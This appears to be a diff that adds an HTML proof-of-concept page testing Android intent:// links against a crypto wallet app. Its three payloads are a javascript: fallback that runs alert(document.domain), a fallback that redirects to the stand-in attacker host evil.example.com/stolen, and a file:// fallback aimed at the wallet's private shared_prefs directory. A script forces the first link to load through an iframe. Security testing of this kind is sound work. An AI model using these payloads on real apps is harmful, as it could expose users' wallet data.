@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Test</title></head>
+<body>
+<h2>Intent Scheme Test</h2>
+<p>Test 1 - browser_fallback_url with javascript:</p>
+<a id="t1" href="intent://example.com#Intent;scheme=https;browser_fallback_url=javascript:alert(document.domain);end">Test 1: javascript: fallback</a>
+<br><br>
+<p>Test 2 - browser_fallback_url with external URL:</p>
+<a id="t2" href="intent://example.com#Intent;scheme=https;browser_fallback_url=https://evil.example.com/stolen;end">Test 2: open external URL</a>
+<br><br>
+<p>Test 3 - file:// scheme:</p>
+<a id="t3" href="intent://example.com#Intent;scheme=https;browser_fallback_url=file:///data/data/com.viabtc.wallet/shared_prefs/;end">Test 3: file:// access</a>
+<br><br>
+<script>
+document.getElementById("t1").addEventListener("click", function(e) {
+    e.preventDefault();
+    var iframe = document.createElement("iframe");
+    iframe.src = this.href;
+    document.body.appendChild(iframe);
+    setTimeout(function() { window.location = document.getElementById("t1").href; }, 100);
+});
+</script>
+</body>
+</html>
